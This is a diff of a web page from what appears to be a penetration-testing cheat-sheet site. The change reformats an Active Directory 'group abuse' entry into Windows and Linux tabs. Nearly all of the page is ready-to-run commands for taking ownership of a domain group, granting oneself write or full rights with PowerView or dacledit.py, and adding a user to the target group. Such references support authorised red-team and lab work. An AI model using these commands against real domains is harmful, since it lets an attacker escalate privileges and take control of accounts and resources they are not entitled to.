@@ -194,43 +194,76 @@
   
   <li><a href="https://tldrbins.github.io/@own/">Own</a></li>
   
+  <li><a href="https://tldrbins.github.io/@dacledit/">Dacledit</a></li>
+  
 </ul>
 
 <div class="content"><hr>
-<h3 id="abuse-1--change-owner-of-the-group-from-windows">Abuse #1 : Change owner of the group (From Windows)</h3>
-<h4 id="1-import-powerviewps1">1. Import PowerView.ps1</h4>
+<h3 id="abuse-1--change-owner-of-the-group">Abuse #1 : Change owner of the group</h3>
+<p>
+<button data-tabset="set1" data-tabcontent="tab1" class="active">Windows</button>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="1-import-powerviewps1">1. Import PowerView.ps1</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="py">ps1</span>
-</span></span></code></pre></div><h4 id="2-change-owner">2. Change owner</h4>
+</span></span></code></pre></div></div>
+<h4 id="2-change-owner">2. Change owner</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Set-DomainObjectOwner</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">TARGET_GROUP</span><span class="p">&gt;</span> <span class="n">-OwnerIdentity</span> <span class="p">&lt;</span><span class="n">USER</span><span class="p">&gt;</span>
-</span></span></code></pre></div><h3 id="abuse-2--add-user-to-the-group-from-windows">Abuse #2 : Add user to the group (From Windows)</h3>
-<h4 id="1-import-powerviewps1-1">1. Import PowerView.ps1</h4>
+</span></span></code></pre></div></div>
+</div></p>
+<h3 id="abuse-2--add-user-to-the-group">Abuse #2 : Add user to the group</h3>
+<p>
+<button data-tabset="set2" data-tabcontent="tab1" class="active">Linux</button>
+
+<button data-tabset="set2" data-tabcontent="tab2" >Windows</button>
+
+<div class="tabcontent" data-tabset="set2" data-tabcontent="tab1"><h4 id="0-install-latest-impacket-included-dacleditpy">0. Install latest impacket (included dacledit.py)</h4>
+<div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/fortra/impacket.git
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> impacket
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pip3 install .
+</span></span></code></pre></div></div>
+<h4 id="1-add-domain-object">1. Add domain object</h4>
+<div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ntpdate -s &lt;DC&gt; <span class="o">&amp;&amp;</span> dacledit.py -k <span class="s1">&#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;&#39;</span> -dc-ip &lt;DC&gt; -principal &lt;USER&gt; -target &lt;TARGET_GROUP&gt; -action write -rights WriteMembers
+</span></span></code></pre></div></div>
+<h4 id="2-add-group-member">2. Add group member</h4>
+<div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kinit &lt;USER&gt;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ntpdate -s &lt;DC&gt; <span class="o">&amp;&amp;</span> net rpc group addmem &lt;TARGET_GROUP&gt; &lt;USER&gt; -U &lt;USER&gt; --use-kerberos<span class="o">=</span>required -S &lt;DC&gt; --no-pass
+</span></span></code></pre></div></div>
+<h4 id="3-check">3. Check</h4>
+<div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ntpdate -s &lt;DC&gt; <span class="o">&amp;&amp;</span> net rpc group members &lt;TARGET_GROUP&gt; -U &lt;USER&gt; --use-kerberos<span class="o">=</span>required -S &lt;DC&gt; --no-pass
+</span></span></code></pre></div></div>
+</div>
+
+<div class="tabcontent" data-tabset="set2" data-tabcontent="tab2"><h4 id="1-import-powerviewps1">1. Import PowerView.ps1</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="py">ps1</span>
-</span></span></code></pre></div><h4 id="2-create-cred-object-runas-optional">2. Create cred object (runas) [optional]</h4>
+</span></span></code></pre></div></div>
+<h4 id="2-create-cred-object-runas-optional">2. Create cred object (runas) [optional]</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$username</span> <span class="p">=</span> <span class="s2">&#34;&lt;DOMAIN&gt;\&lt;USER&gt;&#34;</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$password</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="p">&lt;</span><span class="n">PASSWORD</span><span class="p">&gt;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$cred</span> <span class="p">=</span> <span class="nb">new-object</span> <span class="n">-typename</span> <span class="n">System</span><span class="p">.</span><span class="py">Management</span><span class="p">.</span><span class="py">Automation</span><span class="p">.</span><span class="py">PSCredential</span> <span class="n">-argumentlist</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span>
-</span></span></code></pre></div><h4 id="3-add-user-to-group">3. Add user to group</h4>
+</span></span></code></pre></div></div>
+<h4 id="3-add-user-to-group">3. Add user to group</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Add-DomainObjectAcl</span> <span class="n">-TargetIdentity</span> <span class="p">&lt;</span><span class="n">TARGET_GROUP</span><span class="p">&gt;</span> <span class="n">-PrincipalIdentity</span> <span class="s1">&#39;&lt;DOMAIN&gt;/&lt;USER&gt;&#39;</span> <span class="n">-Rights</span> <span class="n">All</span> <span class="n">-DomainController</span> <span class="p">&lt;</span><span class="n">DC</span><span class="p">&gt;</span> <span class="n">-Credential</span> <span class="nv">$cred</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Add-DomainGroupMember</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">TARGET_GROUP</span><span class="p">&gt;</span> <span class="n">-Members</span> <span class="p">&lt;</span><span class="n">USER</span><span class="p">&gt;</span> <span class="n">-Credential</span> <span class="nv">$cred</span>
-</span></span></code></pre></div><h4 id="check">Check</h4>
+</span></span></code></pre></div></div>
+<h4 id="check">Check</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-DomainGroupMember</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">TARGET_GROUP</span><span class="p">&gt;</span> <span class="n">-Domain</span> <span class="p">&lt;</span><span class="n">DOMAIN</span><span class="p">&gt;</span> <span class="n">-DomainController</span> <span class="p">&lt;</span><span class="n">DC</span><span class="p">&gt;</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="p">|</span> <span class="nb">fl </span><span class="n">MemberName</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Or</span>
 </span></span><span class="line"><span class="cl"><span class="n">net</span> <span class="n">user</span> <span class="p">&lt;</span><span class="n">USER</span><span class="p">&gt;</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Exit current sessions or re-login</span>
 </span></span><span class="line"><span class="cl"><span class="n">whoami</span> <span class="p">/</span><span class="n">groups</span>
-</span></span></code></pre></div><h3 id="abuse-2--add-user-to-the-group-from-linux">Abuse #2 : Add user to the group (From Linux)</h3>
-<h4 id="0-install-latest-impacket-included-dacleditpy">0. Install latest impacket (included dacledit.py)</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/fortra/impacket.git
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> impacket
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pip3 install .
-</span></span></code></pre></div><h4 id="1-add-domain-object">1. Add domain object</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ntpdate -s &lt;DC&gt; <span class="o">&amp;&amp;</span> dacledit.py -k <span class="s1">&#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;&#39;</span> -dc-ip &lt;DC&gt; -principal &lt;USER&gt; -target &lt;TARGET_GROUP&gt; -action write -rights WriteMembers
-</span></span></code></pre></div><h4 id="2-add-group-member">2. Add group member</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kinit &lt;USER&gt;
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ntpdate -s &lt;DC&gt; <span class="o">&amp;&amp;</span> net rpc group addmem &lt;TARGET_GROUP&gt; &lt;USER&gt; -U &lt;USER&gt; --use-kerberos<span class="o">=</span>required -S &lt;DC&gt; --no-pass
-</span></span></code></pre></div><h4 id="3-check">3. Check</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ntpdate -s &lt;DC&gt; <span class="o">&amp;&amp;</span> net rpc group members &lt;TARGET_GROUP&gt; -U &lt;USER&gt; --use-kerberos<span class="o">=</span>required -S &lt;DC&gt; --no-pass
-</span></span></code></pre></div><br></div></div>
+</span></span></code></pre></div></div>
+</div></p>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
